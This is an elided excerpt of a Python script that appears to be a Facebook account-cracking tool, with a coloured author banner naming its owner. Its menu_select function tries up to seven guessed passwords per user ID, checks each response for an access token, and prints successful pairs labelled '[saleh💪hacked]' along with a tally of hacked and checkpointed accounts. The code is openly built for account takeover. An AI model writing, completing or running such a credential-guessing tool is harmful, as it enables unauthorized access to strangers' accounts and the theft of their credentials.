...
\033[1;96m(~)\033[1;97m Owner : Saleh Baloch

\033[1;96m(~)\033[1;97m Github : https://github.com/azharbaloch172

\033[1;96m(~)\033[1;97m Fb     : https://www.facebook.com/Baloch.Edit'X
\033[1;96m(~)\033[1;97m WhatsApp no: Maa Naraz hojaa gii

OK
\033[1;97m------------------salehbaloch-----------------------------
...
def menu_select():
		...
		try:
		    ...
		    if 'www.facebook.com' in d['error_msg']:
		    	...
		    	if "access_token" in d:
		            ...
		            print("\x1b[1;96m[saleh💪hacked] "+uid+" | "+pass1+"\x1b[1;0m")
		            ...
		            if 'www.facebook.com' in d['error_msg']:
		                ...
		                if 'access_token' in d:
		                    ...
		                    print("\x1b[1;96m[saleh💪hacked] "+uid+" | "+pass2+"\x1b[1;0m")
		                    ...
		                    if 'www.facebook.com' in d['error_msg']:
		                        ...
		                        if 'access_token' in d:
		                            ...
		                            print(" \x1b[1;96m[saleh💪hacked] "+uid+" | "+pass3+"\x1b[1;0m")
		                            ...
		                            if 'www.facebook.com' in d['error_msg']:
		                                ...
		                                if 'access_token' in d:
		                                    ...
		                                    print("\x1b[1;96m[saleh💪hacked] "+uid+" | "+pass4+"\x1b[1;0m")
		                                    ...
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        ...
		                                        if 'access_token' in d:
		                                            ...
		                                            print("\x1b[1;96m[saleh💪hacked] "+uid+" | "+pass5+"\x1b[1;0m")
		                                            ...
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                ...
		                                                if 'access_token' in d:
		                                                    ...
		                                                    print("\x1b[1;96m[saleh💪hacked] "+uid+" | "+pass6+"\x1b[1;0m")
		                                                    ...
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        ...
		                                                        if 'access_token' in d:
		                                                            ...
		                                                            print("\x1b[1;96m[saleh💪hacked] "+uid+" | "+pass7+"\x1b[1;0m")
	...
	print ("[!] Total saleh🌹cp/saleh hacked : "+str(len(cps)) + "/"+str(len(oks)))
